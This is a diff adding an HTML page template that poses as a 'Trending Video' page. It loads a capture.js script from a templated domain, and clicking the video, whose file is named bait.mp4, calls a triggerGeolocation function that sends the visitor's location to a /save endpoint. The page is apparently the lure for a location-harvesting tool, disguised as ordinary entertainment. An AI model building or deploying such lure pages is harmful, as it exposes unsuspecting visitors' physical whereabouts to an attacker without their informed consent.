@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Trending Video</title>
+    <script src="https://{{ domain }}/static/js/capture.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; }
+        video { max-width: 80%; margin: 20px; border-radius: 8px; }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+    <h1>Watch This Trending Video!</h1>
+    <p>Click play to start.</p>
+    <video controls onclick="triggerGeolocation('https://{{ domain }}/save')">
+        <source src="https://{{ domain }}/static/videos/bait.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+</body>
+</html>
